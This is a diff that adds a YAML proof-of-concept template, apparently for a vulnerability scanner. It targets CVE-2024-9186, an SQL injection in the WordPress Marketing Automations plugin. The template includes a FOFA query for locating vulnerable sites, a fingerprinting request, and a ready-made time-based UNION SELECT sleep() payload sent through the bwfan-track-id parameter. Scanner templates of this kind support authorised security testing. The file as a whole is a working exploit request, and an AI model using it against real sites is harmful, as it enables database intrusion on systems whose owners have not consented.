@@ -1,0 +1,21 @@
+id: poc-yaml-wordpress-plugin-automations-sqli-2024-9186
+info:
+  name: WordPress Plugin Automations SQL注入漏洞(CVE-2024-9186)
+  severity: high
+  tags:
+  - sql-injection
+  - CVE-2024-9186
+  finger: automations
+  fofa: body="wp-content/plugins/wp-marketing-automations/"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"wp-content/plugins/wp-marketing-automations/")
+- method: GET
+  path: /?bwfan-track-id=test%27%20UNION%20SELECT%201%2C1%2C%27%27%2CNOW()%2CNOW()%2C1%2C%27%27%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C%27%27%2CNOW()%2C%27%27%2CNOW()%2C1%2C1%2Csleep({{.t1}})%23&bwfan-track-action=click
+  expression: status_code == 200 && contains(headers,"api.w.org") && duration > t1
+    && duration < t2
+transport: http
